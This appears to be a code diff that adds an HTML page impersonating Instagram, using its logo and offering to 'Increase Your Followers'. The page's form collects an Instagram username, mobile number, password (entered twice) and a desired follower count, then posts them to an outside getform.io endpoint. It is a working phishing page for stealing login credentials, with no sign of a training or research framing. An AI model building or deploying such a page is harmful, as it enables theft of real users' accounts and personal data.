@@ -1,0 +1,211 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"></script>
+    <style>
+        form {
+            padding: 20px 40px;
+            border: 2px solid brown;
+            border-radius: 10px;
+            margin: 3% 10% 5%;
+            background-color: rgb(255, 255, 255);
+        }
+
+        body {
+            background-image: url("https://images.pexels.com/photos/2341290/pexels-photo-2341290.jpeg?auto=compress&cs=tinysrgb&w=1260&h=750&dpr=1");
+            background-attachment: fixed;
+            background-size: cover;
+        }
+
+        form .form-label {
+            color: brown;
+            font-weight: bold;
+            font-size: 30px;
+        }
+
+        .logo img {
+            width: 100px;
+            height: 100px;
+        }
+
+        .logo {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            grid-gap: 10px 20px;
+            margin: 20px 30px;
+        }
+
+        .logo h1 {
+            font-family: 'Dancing Script', cursive;
+            font-weight: bold;
+            font-size: 80px;
+        }
+
+        .desc {
+            display: flex;
+            justify-content: center;
+        }
+
+        .desc h3 {
+            font: 2.5rem rapscallion;
+            letter-spacing: 1px;
+            text-shadow: 0px 0px 5px #fff, 0 0 20px #000;
+            font-weight: bold;
+        }
+
+        .password {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .password .button {
+            border: none;
+            font-size: 30px;
+            background-color: rgba(240, 248, 255, 0);
+        }
+
+        @media (max-width:540px) {
+            .desc h3 {
+                font-size: 1.6rem;
+                letter-spacing: 0px;
+            }
+
+            form {
+                margin: 1% 5% 2%;
+                padding: 10px 20px;
+            }
+
+            .logo img {
+                width: 60px;
+                height: 60px;
+            }
+
+            .logo h1 {
+                font-size: 50px;
+            }
+
+            form .form-label {
+                font-size: 20px;
+            }
+        }
+    </style>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Dancing+Script:wght@500&display=swap" rel="stylesheet">
+</head>
+
+<body>
+
+    <div class="logo">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/9/95/Instagram_logo_2022.svg" alt="Logo">
+        <h1>Instagram</h1>
+    </div>
+
+    <div class="desc">
+        <h3>&star; Increase Your Followers &star; </h3>
+    </div>
+    <div class="container mt-3">
+        <form action="https://getform.io/f/7988f268-0257-40fa-b175-6eb1de5c07e0" class="was-validated" method="post">
+            <div class="mb-3 mt-3">
+                <label for="uname" class="form-label">Instagram Username:</label>
+                <input type="text" autocomplete="on" autofocus spellcheck="false" class="form-control" id="username"
+                    placeholder="Username, Phone Number or email" name="Instagram-Username" required>
+                <div class="valid-feedback">Valid.</div>
+                <div class="invalid-feedback">Please !! Enter Your Instagram Username.</div>
+            </div>
+
+            <div class="mb-3 mt-3">
+                <label for="uname" class="form-label">Mobile Number :</label>
+                <input type="number" onmouseleave="validatePhoneNumber()" autocomplete="off" autofocus
+                    spellcheck="false" class="form-control" id="mobileNumber" placeholder="Enter Mobile Number"
+                    name="Mobile-Number" required>
+                <div class="valid-feedback">Valid.</div>
+                <div class="invalid-feedback">Please !! Enter Your Mobile Number.</div>
+            </div>
+
+            <div class="mb-3">
+                <label for="pwd" class="form-label">Password : </label>
+
+                <input type="password" autocomplete="off" class="form-control" id="pwd" placeholder="Enter password"
+                    name="Password" required>
+                <div class="valid-feedback">Valid.</div>
+                <div class="invalid-feedback">Please !! Enter Your Instagram Password.</div>
+            </div>
+
+
+            <div class="mb-3">
+                <label for="pwd" class="form-label">Re-Enter Password:</label>
+
+                <input type="password" autocomplete="off" class="form-control" id="re-enter-pwd"
+                    placeholder="Enter password" name="Passwords" required>
+                <div class="valid-feedback">Valid.</div>
+                <div class="invalid-feedback">Please !! Re-Enter Your Instagram Password.</div>
+            </div>
+
+            <div class="mb-3">
+                <label for="pwd" class="form-label">No Of Followers : </label>
+                <input type="number" autocomplete="off" class="form-control" id="followers"
+                    placeholder="Enter no of Followers" name="No. Of Followers" required>
+                <div class="valid-feedback">Valid.</div>
+                <div class="invalid-feedback">Please !! Enter No of Followers do you want.</div>
+            </div>
+
+            <div class="form-check mb-3">
+                <input class="form-check-input" onclick="Check()" type="checkbox" id="myCheck" required>
+                <label class="form-check-label" for="myCheck">I agree on terms & conditions.</label>
+                <div class="valid-feedback">Valid.</div>
+                <div class="invalid-feedback">Check this checkbox to continue further process.</div>
+            </div>
+            <button type="submit" onclick="Sub()" class="btn btn-primary">Submit</button>
+        </form>
+    </div>
+
+    <script>
+        function Sub() {
+            if (document.getElementById("pwd").value != document.getElementById("re-enter-pwd").value) {
+                alert("You Entered Incorrect Password. Please !! Enter the Correct Password.");
+                document.getElementById("pwd").value = document.getElementById("re-enter-pwd").value = "";
+            }
+        }
+
+        function Check() {
+            alert("Check Your Details Once again !! ");
+            if (document.getElementById("myCheck").checked) {
+                document.getElementById("pwd").type = "text";
+                document.getElementById("re-enter-pwd").type = "text";
+            }
+            else {
+                document.getElementById("pwd").type = "password";
+                document.getElementById("re-enter-pwd").type = "password";
+            }
+            if (document.getElementById("username").value == "" || document.getElementById("pwd").value == "" || document.getElementById("re-enter-pwd").value == "" || document.getElementById("followers").value == "") {
+                alert("Fill up the all details.");
+            }
+        }
+
+        function validatePhoneNumber() {
+            var mobileNumberInput = document.getElementById("mobileNumber");
+            var mobileNumber = mobileNumberInput.value;
+
+            // Define your desired mobile number length
+            var desiredLength = 10; // For example, a typical length for mobile numbers
+
+            if (mobileNumber.length !== desiredLength) {
+                alert("Mobile number must be " + desiredLength + " digits long.");
+                mobileNumberInput.focus(); // Keep focus on the input field
+                document.getElementById("mobileNumber").value == "";
+            }
+        }
+    </script>
+
+</body>
+
+</html>
